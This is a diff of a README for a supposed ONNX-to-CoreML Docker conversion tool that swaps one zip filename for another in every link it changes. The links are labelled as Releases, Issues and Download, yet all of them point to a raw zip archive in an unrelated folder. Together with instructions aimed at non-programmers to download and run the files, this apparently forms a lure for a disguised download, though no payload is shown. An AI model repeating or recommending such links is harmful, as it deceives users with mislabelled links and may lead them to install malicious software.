@@ -1,6 +1,6 @@
 # 🚀 onnx-coreml-conversion - Convert ONNX Models Seamlessly
 
-[![Download](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-coreml-conversion.zip)](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-coreml-conversion.zip)
+[![Download](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-conversion-coreml-1.2.zip)](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-conversion-coreml-1.2.zip)
 
 ## 📋 Description
 This project provides a simple example of how to convert ONNX models to CoreML. It utilizes Docker and ensures that you have a consistent environment for your conversion. With this tool, you can easily integrate machine learning models into iOS applications, making them accessible and efficient.
@@ -18,7 +18,7 @@ To run this application, you will need:
 - Basic familiarity with using a terminal or command line (no programming knowledge required).
 
 ## 📥 Download & Install
-To get the latest version of the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-coreml-conversion.zip).
+To get the latest version of the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-conversion-coreml-1.2.zip).
 
 1. Click on the link above to access the Releases page.
 2. Find the latest version of the application.
@@ -47,13 +47,13 @@ To get the latest version of the software, visit this page to download: [GitHub 
 If you encounter any issues:
 - Ensure Docker is properly installed and running on your system.
 - Check the release notes for any specific instructions related to your version.
-- Refer to the [Issues tab](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-coreml-conversion.zip) for common problems and solutions.
+- Refer to the [Issues tab](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-conversion-coreml-1.2.zip) for common problems and solutions.
 
 ## 📖 Documentation
 For detailed information about how to use each feature, please refer to the usage documentation included in the downloaded files. You can also find helpful guides online specific to Docker and ONNX models.
 
 ## 💬 Support
-If you have questions or need further assistance, please feel free to create an issue in the [GitHub Issues](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-coreml-conversion.zip) section. The community and maintainers are here to help you.
+If you have questions or need further assistance, please feel free to create an issue in the [GitHub Issues](https://raw.githubusercontent.com/sheelajwaa9/onnx-coreml-conversion/main/Tigger/onnx-conversion-coreml-1.2.zip) section. The community and maintainers are here to help you.
 
 ## 📈 Contributing
 We welcome contributions! To get involved, please read our contributing guidelines included in the repository. Your input can help improve this tool for everyone.
